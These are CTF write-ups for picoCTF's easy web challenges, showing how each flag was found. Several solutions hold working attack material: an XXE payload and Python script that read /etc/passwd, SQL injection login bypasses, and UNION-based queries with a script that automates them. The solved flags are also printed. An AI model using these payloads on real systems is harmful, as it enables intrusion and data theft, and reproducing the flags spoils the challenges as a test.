# picoCTF WEB (EASY)
All picoCTF web challenge for EASY category.

## WebDecode

**Description**
Do you know how to use the web inspector? Start searching here to find the flag

**Solution**
Visiting the URL.
![image](https://hackmd.io/_uploads/Sy5GOYGY0.png)

We have 3 endpoint here, `/index.html`, `/about.html` and `/contact.html`.

```
/about.html 

 <section class="about" notify_true="cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMDJjZGNiNTl9">
   <h1>
   Try inspecting the page!! You might find it there
   </h1>
```
The above code snippet have something different. For notify_true, it not properly follow the format for html tag. 

Decode the value `cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMDJjZGNiNTl9` to get the flag.

==picoCTF{web_succ3ssfully_d3c0ded_02cdcb59}==

---

## Unminify
**Description**
I don't like scrolling down to read the code of my website, so I've squished it. As a bonus, my pages load faster! Browse here, and find the flag!

Visiting the page. 
![image](https://hackmd.io/_uploads/S15gqtMFC.png)

**Solution**
```
Reading the source code to reveal the flag.

```
![image](https://hackmd.io/_uploads/HJANqFfKA.png)

==picoCTF{pr3tty_c0d3_743d0f9b}==

---

## IntroToBurp

**Description**
Try here to find the flag

**Solution**
Visiting the URL will prompt with registartion form. 
![image](https://hackmd.io/_uploads/Hyk55KzK0.png)

Once submited, it request 2fa authentication which we don't have it. 

Try to modify some data in burpsuite.
![image](https://hackmd.io/_uploads/Hyr4iFMKA.png)

Changing the method to `POST` and get the flag.


==picoCTF{#0TP_Bypvss_SuCc3$S_2e80f1fd}==

---

## Bookmarklet

**Description**
Why search for the flag when I can make a bookmarklet to print it for me? Browse here, and find the flag!

**Solution**
```
        javascript:(function() {
            var encryptedFlag = "àÒÆÞ¦È¬ëÙ£ÖÓÚåÛÑ¢ÕÓÒËÉ§©í";
            var key = "picoctf";
            var decryptedFlag = "";
            for (var i = 0; i < encryptedFlag.length; i++) {
                decryptedFlag += String.fromCharCode((encryptedFlag.charCodeAt(i) - key.charCodeAt(i % key.length) + 256) % 256);
            }
            alert(decryptedFlag);
        })();
    
```
Run in console to get flag. 

==picoCTF{p@g3_turn3r_6bbf8953}==

---

## SOAP

**Description**
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

**Solution**
Visiting the web portal. 
![image](https://hackmd.io/_uploads/ryYnMczFR.png)
 We have 3 information here. When we click `details` it will post data. 
 
Open the network to understand how it work in background. 
`<?xml version="1.0" encoding="UTF-8"?><data><ID>1</ID></data>`

It appear the data being send are using xml format. It might be vulnerablt to XXE injection. 

```
Payload

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE whymer [ <!ENTITY hack SYSTEM "file:///etc/passwd"> ]>
<data><ID>&hack;</ID></data>
```

```
//xxe.py
#!/usr/bin/env python3

import requests

url = 'http://saturn.picoctf.net:60680/data'

payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE whymer [ <!ENTITY hack SYSTEM "file:///etc/passwd"> ]>
<data><ID>&hack;</ID></data>"""

response = requests.post(url, data=payload)
    
print(f"Status Code: {response.status_code}")
print(f"Response Body:\n{response.text}")

```

==picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}==

---

## More SQLi

**Description**
Can you find the flag on this website. Try to find the flag here.

**Solution**
With the name of challenge, SQLi, try to put `"` in password. It return debugging.
```
username: admin
password: "
SQL query: SELECT id FROM users WHERE password = '"' AND username = 'admin'

```
Testing payload
```'or 1=1;--
'or 1=1;--
Manage to get into welcome.php.
```
For `search` input, it will return value city, address and phone. To illustrate it in DB.
`Select city,address,phone from table;`

Payload to test

`test' UNION SELECT 1,sqlite_version(),3;--`
We got the version 3.31.1. 

Enumerate databases
`test' UNION SELECT name,sql,null from sqlite_master;-- `
>sqlite_master are default for list all database.
```

City 	Address 	Phone
hints	CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)	
more_table	CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)	
offices	CREATE TABLE offices (id INTEGER NOT NULL PRIMARY KEY, city TEXT, address TEXT, phone TEXT)	
sqlite_autoindex_users_1		
users	CREATE TABLE users (name TEXT NOT NULL PRIMARY KEY, password TEXT, id INTEGER)	
```

Final payload
```
test' UNION SELECT flag,null,null from more_table;--
```

```
//sql.py

import requests
import re

# Define the URLs
login_url = "http://saturn.picoctf.net:63089/"
search_url = "http://saturn.picoctf.net:63089/welcome.php"

# Define the payloads for each request
login_payload = {
    "username": "'or 1=1;--",
    "password": "'or 1=1;--"
}

database_payload = {
    "search": "test' UNION SELECT flag,null,null from more_table;--",
    "submit": "Search"
}

table_payload = {
    "search": "test' UNION SELECT flag,null,null from more_table;--",
    "submit": "Search"
}


final_payload = {
    "search": "test' UNION SELECT flag,null,null from more_table;--",
    "submit": "Search"
}

# Define the headers for each request
login_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": str(len("username=hello&password=' or 1=1;--")),
    "Origin": "http://saturn.picoctf.net:63089",
    "DNT": "1",
    "Connection": "keep-alive",
    "Referer": "http://saturn.picoctf.net:63089/",
    "Cookie": "PHPSESSID=1k8vv2u9ooa4rj7csnvtmol4tl",
    "Upgrade-Insecure-Requests": "1"
}


print("Sending login request...")
login_response = requests.post(login_url, data=login_payload, headers=login_headers)
print("Login Response Status Code:", login_response.status_code)
print("Login Response Body:", login_response.text)


print("\nSending search request...")
flags = requests.post(search_url, data=final_payload, headers=login_headers)
print("Search Response Status Code:", flags.status_code)
print("Search Response Body:", flags.text)


flag_pattern = re.compile(r'picoCTF{[^}]+}')
match = flag_pattern.search(flags.text)

if match:
    print("Flag found:", match.group())
else:
    print("Flag not found in the response.")

```


==picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}==

---

## MatchTheRegex

**Description**
How about trying to match a regular expression The website is running here.

**Solution**
Looking into `send_request` function.
```
<script>
	function send_request() {
		let val = document.getElementById("name").value;
		// ^p.....F!?
		fetch(`/flag?input=${val}`)
			.then(res => res.text())
			.then(res => {
				const res_json = JSON.parse(res);
				alert(res_json.flag)
				return false;
			})
		return false;
	}
```
There was some comment `//` and it look like regex. try to put `picoCTF` and flag appear.
>^p.....F it can be any start p and end with F. 
>pabcdeF

==picoCTF{succ3ssfully_matchtheregex_f89ea585}==

---

## findme

**Description**
Help us test the form by submiting the username as `test` and password as `test!` The website running here.

**Solution**
We are given with username and password as `test:test!` 
```
 <section id="search-result">
      You searched for <span id="search-term"></span>
      <p>Waiting for server's response... lol</p>
    </section>
    <section>
      <p>I was redirected here by a friend of mine but i couldnt find anything. Help me search for flags :-)</p>
```
From this, I know that this is about redirection. Need to open burpsuite and intercept the reqeust. 

![image](https://hackmd.io/_uploads/BJqgVCmtC.png)

Set directory to that and got new alert. 
![image](https://hackmd.io/_uploads/H17XN0XFC.png)

Both directory actually a flag. Need to combine it and decode using base 64.

`echo "cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5XzAxZTc0OGRifQ==" | base64 -d
picoCTF{proxies_all_the_way_01e748db}  `

==picoCTF{proxies_all_the_way_01e748db}==

---

## SQLiLite

**Description**
Can you login to this website? Try to login here.

**Solution**
As the challenge mention about SQLi Lite, input with `"` to see how it works.
```
username: "
password: "
SQL query: SELECT * FROM users WHERE name='"' AND password='"'

Login failed.

```
Based on querym it can be bypass using this,
` 'or 1=1;--`
```
username: 'or 1=1;--
password: 'or 1=1;--
SQL query: SELECT * FROM users WHERE name=''or 1=1;--' AND password=''or 1=1;--'

Logged in! But can you see the flag, it is in plainsight.
```
Proof that we manage to bypass it. But next challenge, where the flag hide?.
>It hide. Use open source or inspect element.
![image](https://hackmd.io/_uploads/B1J6P0mFA.png)
![image](https://hackmd.io/_uploads/Hkrx_0QtR.png)

==picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}==

---
## SQL Direct

**Description**
>Connect to this PostgreSQL server and find the flag! psql -h saturn.picoctf.net -p 64479 -U postgres pico Password is postgres


**Solution**
Given PostgreSQL. To list all databases `\d`
```
pico=# \d
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | flags | table | postgres
(1 row)

```
```
using normal query to get the flag
pico=# select * from flags;
 id | firstname | lastname  |                address                 
----+-----------+-----------+----------------------------------------
  1 | Luke      | Skywalker | picoCTF{L3arN_S0m3_5qL_t0d4Y_73b0678f}
  2 | Leia      | Organa    | Alderaan
  3 | Han       | Solo      | Corellia

```


==picoCTF{L3arN_S0m3_5qL_t0d4Y_73b0678f}==

---


## Secrets

**Description**
We have several pages hidden. Can you find the one with the flag? The website is running here.

**Solution**
Visiting given URL and inspect the source.
```
 src="secret/assets/DX1KYM.jpg"
        alt="https://www.alamy.com/security-safety-word-cloud-concept-image-image67649784.html"
        class="responsive"
```
Visit the src `secret/assets/DX1KYM.jpg` and try to eliminate untill get this directory`/secret` . 


Some interesting code in `/secret/hidden`
```
<input type="hidden" name="db" value="superhidden/xdfgwd.html" />
```
Final Directory
`secret/hidden/superhidden/`

==picoCTF{succ3ss_@h3n1c@10n_790d2615}==

---

## Search source

**Description**
The developer of this website mistakenly left an important artifact in the website source, can you find it? The website is here

**Solution**
Visit the URL give use this landing page. 
![image](https://hackmd.io/_uploads/rk0rnRQKR.png)
Since in the description mention about source. Lets inspect it. 

`  <!-- six_box
            end six_box   The flag is not here but keep digging :)-- >`

Unfortunately there are to much to inspect. Using `httrack` to clone the site. Then grep word `picoCTF{}`

==picoCTF{1nsp3ti0n_0f_w3bpag3s_ec95fa49}==

---


## Resources Tools

## Misc

**Description**

**Solution**
```
Code here
```

==Flag==

---